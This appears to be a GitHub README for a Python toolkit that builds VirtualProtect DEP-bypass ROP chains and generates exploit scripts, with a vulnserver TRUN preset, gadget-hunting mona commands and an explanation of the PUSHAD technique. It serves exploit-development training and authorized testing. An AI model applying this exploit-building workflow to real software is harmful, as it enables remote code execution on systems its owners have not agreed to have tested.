# VirtualProtect Inspector

> A comprehensive toolkit for building VirtualProtect-based DEP bypass exploits through Return-Oriented Programming (ROP).

[![Python Version](https://img.shields.io/badge/python-3.7%2B-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Author](https://img.shields.io/badge/author-Anubhav%20Gain-orange.svg)](https://github.com/anubhavg-icpl)

## Overview

**VirtualProtect Inspector** is an educational security research tool designed to help security professionals and researchers understand and develop DEP (Data Execution Prevention) bypass exploits using the Windows `VirtualProtect` API and ROP chains.

### Key Features

- **ROP Chain Builder**: Programmatically build VirtualProtect DEP bypass ROP chains
- **Gadget Finder**: Generate mona.py commands and guidance for finding ROP gadgets
- **Exploit Generator**: Create complete, ready-to-use exploit scripts
- **Configuration System**: Save and load exploit configurations
- **CLI Interface**: Command-line tools for quick operations
- **Educational Examples**: Well-documented example exploits

## Installation

### From Source

```bash
git clone https://github.com/anubhavg-icpl/virtual-protect-inspector.git
cd virtual-protect-inspector
pip install -e .
```

### Requirements

- Python 3.7+
- No external dependencies (uses only standard library)

## Quick Start

### 1. Using the Python API

```python
from vp_inspector import ROPChainBuilder, Config

# Load a preset configuration
config = Config()
target = config.load_preset("vulnserver_trun")

# Build a ROP chain
builder = ROPChainBuilder()
builder.set_virtualprotect_iat(target.virtualprotect_iat)
builder.set_writable_address(target.writable_address)
builder.set_gadgets_from_dict(target.gadgets)

rop_chain = builder.build()
print(f"ROP Chain ({len(rop_chain)} bytes): {rop_chain.hex()}")
```

### 2. Using the CLI

```bash
# Generate gadget hunting guide
vp-inspector gadgets -m essfunc,msvcrt,kernel32

# List available presets
vp-inspector preset --list

# Build exploit from configuration
vp-inspector build config.json -o exploit.py
```

### 3. Run the Example Exploit

```bash
cd examples
python vulnserver_trun_exploit.py -t 192.168.0.112 -p 9999
```

## Understanding the Technique

### What is DEP?

Data Execution Prevention (DEP) is a security feature that marks memory regions as non-executable. When shellcode is placed on the stack (a writable region), DEP prevents its execution.

### How VirtualProtect Bypasses DEP

The `VirtualProtect` API can change memory protection flags at runtime:

```c
BOOL VirtualProtect(
  LPVOID lpAddress,      // Address to modify
  SIZE_T dwSize,         // Size of region
  DWORD  flNewProtect,   // New protection (e.g., 0x40 = PAGE_EXECUTE_READWRITE)
  PDWORD lpflOldProtect  // Pointer to store old protection
);
```

By calling `VirtualProtect` to make our shellcode's memory executable, we can bypass DEP.

### The PUSHAD Technique

This tool uses the PUSHAD technique to set up the VirtualProtect call:

1. Set up registers with the required values
2. Execute PUSHAD to push all registers to the stack
3. The pushed values become VirtualProtect's parameters
4. Jump to VirtualProtect via JMP [EAX]
5. VirtualProtect returns to our JMP ESP gadget
6. Shellcode executes

```
Register → Stack Position → VirtualProtect Parameter
───────────────────────────────────────────────────
EAX      → [ESP+28]       → (Ptr to VirtualProtect)
ECX      → [ESP+24]       → lpflOldProtect
EDX      → [ESP+20]       → flNewProtect (0x40)
EBX      → [ESP+16]       → dwSize
ESP      → [ESP+12]       → lpAddress (shellcode location)
EBP      → [ESP+8]        → (padding)
ESI      → [ESP+4]        → (return address - JMP [EAX])
EDI      → [ESP+0]        → (ROP NOP)
```

## Finding Gadgets

### Required Gadgets

| Gadget | Purpose | Example |
|--------|---------|---------|
| `pop ebp; ret` | Stack alignment | `!py mona find -s "pop ebp # ret"` |
| `pop eax; ret` | Load values | `!py mona find -s "pop eax # ret"` |
| `neg eax; ret` | Avoid null bytes | `!py mona find -s "neg eax # ret"` |
| `xchg eax, ebx; ret` | Set dwSize | `!py mona find -s "xchg eax, ebx # ret"` |
| `xchg eax, edx; ret` | Set flNewProtect | `!py mona find -s "xchg eax, edx # ret"` |
| `pop ecx; ret` | Set lpflOldProtect | `!py mona find -s "pop ecx # ret"` |
| `pop edi; ret` | ROP NOP setup | `!py mona find -s "pop edi # ret"` |
| `pop esi; ret` | JMP [EAX] setup | `!py mona find -s "pop esi # ret"` |
| `jmp [eax]` | Call VirtualProtect | `!py mona find -s "jmp dword ptr [eax]"` |
| `pushad; ret` | Setup call | `!py mona find -s "pushad # ret"` |
| `jmp esp` | Return to shellcode | `!py mona jmp -r esp` |

### Using the Gadget Finder

```python
from vp_inspector import GadgetFinder

finder = GadgetFinder(bad_chars="\\x00")

# Generate hunting guide
guide = finder.generate_gadget_hunt_script(["essfunc", "msvcrt", "kernel32"])
print(guide)

# Calculate negation values
neg_value = finder.get_negation_value(0x40)  # PAGE_EXECUTE_READWRITE
print(f"Load 0x{neg_value:08x}, then NEG EAX to get 0x40")
```

## Project Structure

```
virtual-protect-inspector/
├── vp_inspector/
│   ├── __init__.py         # Package initialization
│   ├── rop_builder.py      # ROP chain builder
│   ├── gadget_finder.py    # Gadget finding utilities
│   ├── exploit_generator.py # Exploit generation
│   ├── config.py           # Configuration management
│   └── cli.py              # Command-line interface
├── examples/
│   └── vulnserver_trun_exploit.py
├── setup.py
├── requirements.txt
├── LICENSE
└── README.md
```

## API Reference

### ROPChainBuilder

```python
from vp_inspector import ROPChainBuilder

builder = ROPChainBuilder()

# Configure
builder.set_virtualprotect_iat(0x6250609c)
builder.set_writable_address(0x7653a3c1)
builder.set_protection_size(0x201)
builder.set_protection_flag(0x40)

# Add gadgets
builder.add_gadget("pop_eax", 0x12345678, "POP EAX; RET", "module.dll")

# Build
rop_chain = builder.build()

# Export
python_code = builder.export_python()
```

### ExploitGenerator

```python
from vp_inspector import ExploitGenerator, Config

config = Config()
target = config.load_preset("vulnserver_trun")

generator = ExploitGenerator(target)
generator.set_shellcode(shellcode_bytes)

# Generate payload
payload = generator.generate_payload(prefix=b"TRUN /.:/ ")

# Export as Python script
generator.export_python_exploit("192.168.0.100", 9999, "exploit.py")
```

### Config

```python
from vp_inspector import Config

config = Config()

# List presets
presets = config.list_presets()

# Load preset
target = config.load_preset("vulnserver_trun")

# Create custom config
custom = config.create_custom_config(
    name="My Target",
    offset=2003,
    virtualprotect_iat=0x12345678,
    writable_address=0x87654321
)

# Export/Import
config.export_config(target, "config.json")
loaded = config.import_config("config.json")
```

## Troubleshooting

### Common Issues

1. **Exploit crashes before VirtualProtect**
   - Verify all gadget addresses are correct for your target system
   - Check for bad characters in addresses
   - Ensure modules don't have ASLR enabled

2. **VirtualProtect fails**
   - Verify the IAT address points to VirtualProtect
   - Check that writable_address is actually writable
   - Ensure protection_size covers your shellcode

3. **Shellcode doesn't execute**
   - Verify JMP ESP gadget is correct
   - Check shellcode doesn't contain bad characters
   - Ensure NOP sled is sufficient

### Debugging Tips

```python
# Enable debug output
builder.build(validate=True)  # Will raise on missing gadgets

# Get detailed chain info
print(builder.get_chain_formatted())
```

## Legal Disclaimer

**This tool is provided for educational and authorized security testing purposes only.**

- Only use against systems you own or have explicit written permission to test
- Ensure compliance with all applicable laws and regulations
- The author is not responsible for misuse of this tool

## Contributing

Contributions are welcome! Please feel free to submit issues and pull requests.

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Author

**Anubhav Gain**
- Email: anubhavg@infopercept.com
- GitHub: [@anubhavg-icpl](https://github.com/anubhavg-icpl)

## Acknowledgments

- Based on the VirtualProtect DEP Bypass technique
- Inspired by the security research community
- Thanks to all contributors and testers

---

*Made with ❤️ for the security research community*
